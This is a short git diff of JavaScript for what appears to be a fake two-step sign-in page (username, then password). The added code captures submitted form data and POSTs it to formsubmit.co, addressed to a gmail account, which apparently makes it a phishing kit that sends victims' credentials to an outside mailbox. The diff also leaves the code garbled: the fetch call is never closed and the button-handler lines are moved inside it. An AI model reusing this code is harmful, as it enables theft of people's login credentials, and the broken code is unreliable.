@@ -7,16 +7,16 @@ document.addEventListener('DOMContentLoaded', () => {
 
     let unameVal = pwdVal = false;
     /////next button
-    const nxt = document.getElementById('btn_next');
+     document.getElementById("contactForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
 
- const formData = new FormData(e.target);
+  const formData = new FormData(e.target);
 
   await fetch("https://formsubmit.co/blueprint019019@gmail.com", {
     method: "POST",
     body: formData
 
-
-
+    const nxt = document.getElementById('btn_next');
 
 
     nxt.addEventListener('click', () => {
@@ -31,7 +31,7 @@ document.addEventListener('DOMContentLoaded', () => {
             view = "pwd";
         }
     })
-  });
+           })
     //////sign in button
 
     const sig = document.getElementById('btn_sig');
